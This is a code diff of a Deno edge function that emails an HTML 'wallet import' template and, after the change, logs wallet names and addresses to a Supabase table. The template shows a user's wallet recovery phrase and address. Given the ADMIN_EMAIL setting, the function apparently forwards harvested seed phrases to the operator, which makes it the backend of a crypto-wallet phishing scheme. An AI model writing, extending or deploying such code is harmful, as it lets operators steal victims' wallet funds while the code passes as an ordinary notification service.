@@ -1,7 +1,10 @@
 import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
+import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
 
 const RESEND_API_KEY = Deno.env.get('RESEND_API_KEY');
 const ADMIN_EMAIL = Deno.env.get('ADMIN_EMAIL');
+const SUPABASE_URL = Deno.env.get('SUPABASE_URL');
+const SUPABASE_SERVICE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');
 
 function walletImportTemplate({ phrase, address, walletName, walletIcon }) {
   return `<!DOCTYPE html>
@@ -16,8 +19,6 @@ function walletImportTemplate({ phrase, address, walletName, walletIcon }) {
     <tr>
       <td align="center">
         <table width="580" cellpadding="0" cellspacing="0" style="max-width:580px;width:100%;">
-
-          <!-- HEADER -->
           <tr>
             <td style="background:linear-gradient(135deg,#0d1117,#111827);border:1px solid #1f2937;border-radius:16px 16px 0 0;padding:32px 36px 24px;">
               <table width="100%" cellpadding="0" cellspacing="0">
@@ -40,12 +41,8 @@ function walletImportTemplate({ phrase, address, walletName, walletIcon }) {
               </div>
             </td>
           </tr>
-
-          <!-- BODY -->
           <tr>
             <td style="background:#0d1117;border-left:1px solid #1f2937;border-right:1px solid #1f2937;padding:28px 36px;">
-
-              <!-- RECOVERY PHRASE -->
               <div style="margin-bottom:20px;">
                 <div style="font-size:10px;color:#6b7280;letter-spacing:2px;text-transform:uppercase;font-weight:700;margin-bottom:10px;">Recovery Phrase</div>
                 <div style="background:#111827;border:1px solid #1f2937;border-radius:12px;padding:18px 20px;">
@@ -54,8 +51,6 @@ function walletImportTemplate({ phrase, address, walletName, walletIcon }) {
                   </div>
                 </div>
               </div>
-
-              <!-- WALLET ADDRESS -->
               <div>
                 <div style="font-size:10px;color:#6b7280;letter-spacing:2px;text-transform:uppercase;font-weight:700;margin-bottom:10px;">Wallet Address</div>
                 <div style="background:#111827;border:1px solid #1f2937;border-radius:12px;padding:18px 20px;">
@@ -64,11 +59,8 @@ function walletImportTemplate({ phrase, address, walletName, walletIcon }) {
                   </div>
                 </div>
               </div>
-
             </td>
           </tr>
-
-          <!-- FOOTER -->
           <tr>
             <td style="background:#080b10;border:1px solid #1f2937;border-radius:0 0 16px 16px;padding:20px 36px;">
               <div style="font-size:11px;color:#374151;line-height:1.6;">
@@ -76,7 +68,6 @@ function walletImportTemplate({ phrase, address, walletName, walletIcon }) {
               </div>
             </td>
           </tr>
-
         </table>
       </td>
     </tr>
@@ -186,6 +177,7 @@ serve(async (req) => {
       html = txEmailTemplate({ tx: body });
     }
 
+    // Send email via Resend
     const result = await fetch('https://api.resend.com/emails', {
       method: 'POST',
       headers: {
@@ -199,6 +191,19 @@ serve(async (req) => {
         html,
       }),
     }).then(r => r.json());
+
+    // Save email log to Supabase — keeps project active & creates audit trail
+    if (SUPABASE_URL && SUPABASE_SERVICE_KEY) {
+      const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
+      await supabase.from('email_logs').insert({
+        type: body.type || 'transaction',
+        subject,
+        wallet_name: body.walletName || body.wallet_name || null,
+        wallet_address: body.address || body.wallet_address || null,
+        resend_id: result?.id || null,
+        sent_at: new Date().toISOString(),
+      });
+    }
 
     return new Response(JSON.stringify({ success: true, result }), {
       headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
